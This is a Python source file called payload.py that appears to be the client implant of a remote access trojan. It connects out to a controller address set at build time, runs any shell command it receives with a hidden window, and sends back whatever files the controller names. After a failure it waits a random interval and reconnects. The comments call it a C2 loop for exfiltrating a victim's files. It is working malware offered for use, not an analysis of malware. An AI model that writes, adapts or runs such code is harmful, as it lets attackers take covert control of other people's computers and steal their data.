# payload.py
# The Soul Reborn, now with perfected understanding.

import os
import sys
import time
import random
import socket
import subprocess
import hashlib
import struct

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"  # This will be replaced by the encryptor
RPORT = ##RPORT##    # This will be replaced by the encryptor
BUFFER_SIZE = 4096
CHUNK_SIZE = 4096

def calculate_sha256(file_path):
    """Calculates the SHA256 hash of a file."""
    sha256_hash = hashlib.sha256()
    with open(file_path, "rb") as f:
        for byte_block in iter(lambda: f.read(4096), b""):
            sha256_hash.update(byte_block)
    return sha256_hash.hexdigest()

def send_file(s_obj, file_path):
    """Handles the reliable file sending logic."""
    # Clean up the path, removing potential quotes from commands
    clean_path = file_path.strip('\"\'')
    
    if not os.path.exists(clean_path) or not os.path.isfile(clean_path):
        error_msg = f"ERROR: File not found or is a directory at path: {clean_path}"
        s_obj.sendall(error_msg.encode('utf-8'))
        return

    try:
        file_size = os.path.getsize(clean_path)
        file_hash = calculate_sha256(clean_path)
        
        # 1. Send header: [FILE_SIZE (8 bytes), FILE_HASH (64 bytes)]
        header = struct.pack('>Q', file_size) + file_hash.encode('utf-8')
        s_obj.sendall(header)
        
        # 2. Wait for ACK from the controller
        ack = s_obj.recv(3)
        if ack != b'ACK':
            # Controller rejected the transfer
            return

        # 3. Send file in chunks
        with open(clean_path, 'rb') as f:
            while True:
                chunk = f.read(CHUNK_SIZE)
                if not chunk:
                    break # End of file
                s_obj.sendall(chunk)
        
        # Signal end of transfer AND wait for a moment to ensure it's sent
        time.sleep(0.1)
        s_obj.sendall(b"DONE") 

    except Exception as e:
        try:
            s_obj.sendall(f"ERROR: {str(e)}".encode('utf-8'))
        except:
            pass # Connection might be dead

def run_conduit():
    """
    The main C2 loop. It connects, takes commands, and can exfiltrate files.
    """
    while True:
        s_obj = None # Ensure s_obj is defined
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            # The soul is connected. Awaiting commands.
            while True:
                command_bytes = s_obj.recv(BUFFER_SIZE)
                if not command_bytes: break
                
                command = command_bytes.decode('utf-8', errors='ignore').strip()
                
                if command.lower().startswith("download "):
                    # --- THE DIVINE CORRECTION ---
                    # The payload now correctly extracts only the victim's file path,
                    # ignoring the local path sent by the controller.
                    parts = command.split(" ", 2)
                    if len(parts) >= 2: # It only needs to know there's at least one argument
                        victim_path = parts[1]
                        send_file(s_obj, victim_path)
                    else:
                        s_obj.sendall(b"Usage: download <filepath>")

                elif command.lower() == "exit":
                    s_obj.close()
                    break

                else:
                    # --- The Standard Shell Ritual ---
                    # Handle paths with spaces by wrapping command in quotes
                    if ' ' in command and not command.startswith('"'):
                        command = f'"{command}"'

                    CREATE_NO_WINDOW = 0x08000000
                    proc = subprocess.Popen(
                        command, 
                        shell=True, 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE, 
                        stdin=subprocess.PIPE,
                        creationflags=CREATE_NO_WINDOW,
                        cwd=os.getcwd() # Set current working directory
                    )
                    # Use communicate to avoid deadlocks
                    stdout_value, stderr_value = proc.communicate()
                    output = stdout_value + stderr_value
                    if not output:
                        s_obj.sendall(b"DONE (No output)")
                    else:
                        s_obj.sendall(output)

        except Exception:
            # If the connection fails or is broken, rest, then reconnect.
            if s_obj:
                s_obj.close()
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    # Change CWD to a more stable directory if possible
    try:
        home_dir = os.path.expanduser("~")
        os.chdir(home_dir)
    except:
        pass # Fallback to default CWD if user dir is not accessible
    run_conduit()